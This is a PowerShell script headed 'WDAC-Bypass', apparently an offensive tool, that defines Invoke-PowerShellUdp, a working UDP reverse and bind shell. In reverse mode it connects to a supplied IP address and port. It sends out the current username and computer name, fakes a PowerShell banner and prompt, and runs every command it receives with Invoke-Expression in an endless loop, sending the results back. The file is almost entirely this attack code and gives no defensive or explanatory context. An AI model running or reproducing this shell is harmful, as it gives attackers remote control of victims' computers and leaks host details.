# WDAC-Bypass

function Invoke-PowerShellUdp
{         
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
 
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,
 
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,
 
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,
 
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
 
    )
 
    #Connect back if the reverse switch is used.
    if ($Reverse)
    {
        $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPAddress),$Port)
        $client = New-Object System.Net.Sockets.UDPClient
    }
 
    #Bind to the provided port if Bind switch is used.
   if ($Bind)
    {
        $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::ANY,$Port)
        $client = New-Object System.Net.Sockets.UDPClient($Port)
        $client.Receive([ref]$endpoint)
    }
 
    [byte[]]$bytes = 0..255|%{0}
 
    #Send back current username and computername
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $client.Send($sendbytes,$sendbytes.Length,$endpoint)
 
    #Show an interactive PowerShell prompt
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS (' + [System.Diagnostics.Process]::GetCurrentProcess().Id + ') ' + (Get-Location).Path + '>')
    $client.Send($sendbytes,$sendbytes.Length,$endpoint)
     
    while($true)
    {
        $receivebytes = $client.Receive([ref]$endpoint)
        $returndata = ([text.encoding]::ASCII).GetString($receivebytes)
        $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
 
        $sendback = $result +  'PS (' + [System.Diagnostics.Process]::GetCurrentProcess().Id + ') ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback + $x
 
        #Send results back
        $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2)
        $client.Send($sendbytes,$sendbytes.Length,$endpoint)
    }
    $client.Close()
}
